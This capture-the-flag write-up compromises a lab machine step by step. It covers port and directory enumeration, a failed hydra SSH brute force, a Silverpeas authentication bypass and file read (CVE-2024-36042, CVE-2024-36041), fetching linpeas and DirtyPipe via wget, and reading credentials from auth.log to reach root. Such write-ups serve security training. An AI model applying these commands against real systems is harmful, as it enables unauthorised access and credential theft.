# SilverPlatter3---badr Writeup

## Enumeration

Nmap scan revealed three open ports:

nmap -sV -sC -p- <target_ip>

- 22 — OpenSSH 8.9p1
- 80 — nginx 1.18.0
- 8080 — HTTP proxy

Browsing port 80 revealed the site "Hack Smarter Security". The page 
source was examined for useful information. Notable details included 
the HTML5 UP template, loaded JavaScript files, and a demo form.

Further enumeration revealed the company founder Tyler Ramsbey, members 
referred to as the "1337est", and a reference stating their project 
manager could be reached on Silverpeas with username scr1ptkiddy.

Gobuster on port 8080:

gobuster dir -u http://<target_ip>:8080 -w /usr/share/wordlists/dirb/common.txt

Revealed /website and /console. /console returned 404 and /website 
returned 403. Then scanned /website further using the below payload.

gobuster dir -u http://<target_ip>:8080/website \
-w /usr/share/wordlists/dirb/common.txt \
-x php,html,txt,conf,json,yml

But this didn't yield anything.

---

## Attempted — SSH Brute Force

With username scr1ptkiddy discovered, SSH brute force was attempted. 
The room briefing stated their password policy checks against rockyou.txt 
and rejects any matches — meaning rockyou.txt would be useless.

Scraped the website with cewl:

cewl http://<target_ip> -d 3 -m 5 -w cewl_wordlist.txt

Generated targeted wordlist with cupp:

cupp -i
* Name: Tyler, Surname: Ramsbey
* Company: HackSmarterSecurity
* Keywords: 1337est, silverplatter
* Leet mode: Y

Combined wordlists and ran hydra:

cat cewl_wordlist.txt tyler.txt > final_wordlist.txt
hydra -l scr1ptkiddy -P final_wordlist.txt ssh://<target_ip>

Hydra returned 0 results. This attack vector was abandoned.

---

## Initial Access — Silverpeas CVE-2024-36042

As the page suggested to talk to the manager on silverpeas I used this as a directory.
Navigating to http:// <target> :8080/silverpeas revealed a Silverpeas 
login page.

CVE-2024-36042 — an authentication bypass vulnerability — was exploited 
by intercepting the login POST request in Burp Suite and completely 
removing the password field. This successfully authenticated as 
scr1ptkiddy.

Inside Silverpeas, a message from the manager was found but contained 
no credentials. No shared documents or other useful content was found.

Attempts were made to log in as tyler and administrateur using the same 
bypass — tyler failed with all username variations, and the CVE did not 
work against the administrateur account.

---

## File Read — CVE-2024-36041

Still authenticated as scr1ptkiddy, CVE-2024-36041 — an authenticated 
arbitrary file read vulnerability — was exploited. This revealed 
credentials stored on the server:

Username: tim
Password: [REDACTED]

SSH access gained:

ssh tim@<target_ip>

---

## Privilege Escalation — Enumeration as Tim

Basic privilege escalation checks were performed:

sudo -l
find / -perm -4000 2>/dev/null
cat /etc/crontab
find / -writable -not -path "/run/*" -not -path "/proc/*" \
-not -path "/sys/*" 2>/dev/null

Results:
- sudo -l — tim had no sudo rights
- SUID binaries — nothing exploitable
- Cron jobs — nothing writable
- Writable files — some systemd service files and sockets, none exploitable

LinPEAS was transferred and executed:

# Attack box
python3 -m http.server 8000

# Target
wget http://<attack_ip>:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

LinPEAS flagged:
- CVE-2022-0847 (DirtyPipe) — kernel 5.15.0 fell within vulnerable range
- /run/docker.sock — writable but tim lacked docker group permissions
- Several writable systemd service files — all empty, dead ends

DirtyPipe was compiled on the attack box and transferred:

gcc dirtypipe.c -o dirtypipe -O2 -Wall
chmod +x dirtypipe
python3 -m http.server 8000

# Target
wget http://<attack_ip>:8000/dirtypipe
chmod +x dirtypipe
./dirtypipe /usr/bin/passwd

Multiple attempts were made targeting various SUID binaries. The exploit 
ran but /tmp/sh was inconsistently created — sometimes as a directory, 
sometimes owned by tim rather than root. After multiple attempts this 
was determined to be a LinPEAS false positive and abandoned.

Docker socket exploitation was also attempted but as tim was not in the docker group permission was denied. Also abandoned.

---

## Privilege Escalation — Tyler's Password via Logs

Tim's id command revealed membership of the adm group:

id
# uid=1001(tim) gid=1001(tim) groups=1001(tim),4(adm)

The adm group grants read access to system logs in /var/log.
/var/log/auth.log.2 was examined:

cat /var/log/auth.log.2

This contained a full history of tyler's setup commands. Critically, 
tyler had run docker commands with a plaintext password visible in 
the command arguments:

docker run --name postgresql -d -e POSTGRES_PASSWORD=[REDACTED] ...
docker run --name silverpeas ... -e DB_PASSWORD=[REDACTED] ...

Password reuse was suspected. Switching to tyler succeeded:

su tyler
# password: [REDACTED]

---

## Root

Tyler had full sudo privileges. Root was obtained immediately:

sudo su
cat /root/root.txt

<img width="437" height="180" alt="image" src="https://github.com/user-attachments/assets/79f5c9f6-5ead-4563-bf86-4c914a6d5038" />

